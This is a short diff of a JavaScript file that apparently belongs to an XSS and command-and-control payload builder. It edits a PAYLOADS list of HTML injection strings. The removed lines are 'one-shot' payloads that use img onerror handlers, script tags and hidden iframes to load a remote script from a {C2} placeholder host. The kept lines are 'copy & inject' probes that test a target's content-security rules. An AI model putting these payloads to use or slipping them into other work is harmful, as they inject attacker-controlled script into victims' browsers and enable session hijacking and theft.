@@ -1505,11 +1505,7 @@ function plParts(){
            B64:btoa(imp), FCC:fcc.join(","), UENC:encodeURIComponent(U) };
 }
 var PAYLOADS = [
-  {sec:"Probe · one-shot — connection check + trigger in one injection", items:[
-    {n:"one-shot · img", d:"probe hit via img, trigger via img onerror", c:'<img src="{BASE}/probe?tag=hit"><img src=x onerror="s=document.createElement(\'script\');s.src=\'{C2}\';document.body.appendChild(s)">'},
-    {n:"one-shot · script", d:"probe hit via img, trigger via classic script tag", c:'<img src="{BASE}/probe?tag=hit"><script src="{C2}"><\/script>'},
-    {n:"one-shot · style", d:"probe hit via stylesheet, trigger via img onerror", c:'<link rel="stylesheet" href="{BASE}/probe.css?tag=hit"><img src=x onerror="s=document.createElement(\'script\');s.src=\'{C2}\';document.body.appendChild(s)">'},
-    {n:"one-shot · iframe", d:"probe hit via hidden iframe, trigger via classic script tag", c:'<iframe src="{BASE}/probe?tag=hit" style="display:none"><\/iframe><script src="{C2}"><\/script>'},
+  {sec:"Probe — connection check (copy & inject)", items:[
     {n:"img probe", d:"JS-free — checks img-src only (1x1 GIF response)", c:'<img src="{BASE}/probe?tag=img">'},
     {n:"script probe", d:"checks script-src (no session created)", c:'<script src="{BASE}/probe.js?tag=script"><\/script>'},
     {n:"css probe", d:"checks style-src", c:'<link rel="stylesheet" href="{BASE}/probe.css?tag=css">'},
